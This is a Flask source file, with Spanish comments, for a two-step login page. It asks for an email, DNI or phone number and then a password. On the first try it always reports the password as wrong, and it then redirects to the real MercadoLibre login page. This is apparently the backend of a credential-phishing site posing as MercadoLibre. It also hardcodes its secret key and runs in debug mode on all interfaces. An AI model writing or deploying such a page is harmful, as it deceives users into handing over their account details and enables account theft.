from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = 'clave_secreta_segura_123'  # Cambia esto por una clave más segura

# Ruta para la página inicial (Ingreso de email/DNI/teléfono)
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        user_input = request.form.get("user_input", "").strip() # "user_input" es el name="user_input" dentro del input del form

        # Validación básica (puedes agregar regex para validar email/teléfono/DNI)
        if user_input:
            session["user_input"] = user_input  # Guarda el dato en la sesión
            return redirect(url_for("password"))  # Redirige al paso 2
        else:
            error = "Por favor, ingresa un dato válido."
            return render_template("index.html", error=error)

    return render_template("index.html")

# Ruta para la contraseña
@app.route("/password", methods=["GET", "POST"])
def password():
    if "user_input" not in session or "user_input" == "":
        return redirect(url_for("index"))
   
    if request.method == "POST":
        password_input = request.form.get("passwordInput", "").strip()
        first_attempt = request.form.get("first_attempt")

        if not password_input:
            error = "Por favor ingresá tu contraseña."
            return render_template("password.html", user_input=session["user_input"], error=error)
        if first_attempt:
            error = "Contraseña incorrecta. Intenta de nuevo."
            session["first_attempt"] = False
            return render_template("password.html", user_input=session["user_input"], error=error, first_attempt = False)
        if password_input and not first_attempt:
            return redirect("https://www.mercadolibre.com/jms/mla/lgz/msl/login/H4sIAAAAAAAEAy2OwQ6EIAxE_4Wz0TvH_RHSxYrNgpBSFzfGf7eYPc505k1PE3OgzcmvoLEGjxLJk5jBlAiyZE6OZj2kolYlwb-M0CPAkFCQq7FnBwWcX6iljhLeUTOwy-qWmJtaz5R6VB0eWtsguobvL2G_LhBrb4SsYhUp1U5Ta21MyB7mXCDk0ec0Ak8aYwxUFYL9vWfsGpRRxQmD_xjbvesGQ5enp-AAAAA/user")



    return render_template("password.html", user_input=session["user_input"])


# Ruta de Dashboard o Bienvenida (luego del login exitoso)
# @app.route("/dashboard")
# def dashboard():
#     if "user_input" not in session:
#         return redirect(url_for("index"))  # Evita que usuarios sin login accedan

#     return f"<h1>Bienvenido, {session['user_input']}!</h1>"

# Ejecutar la app
if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
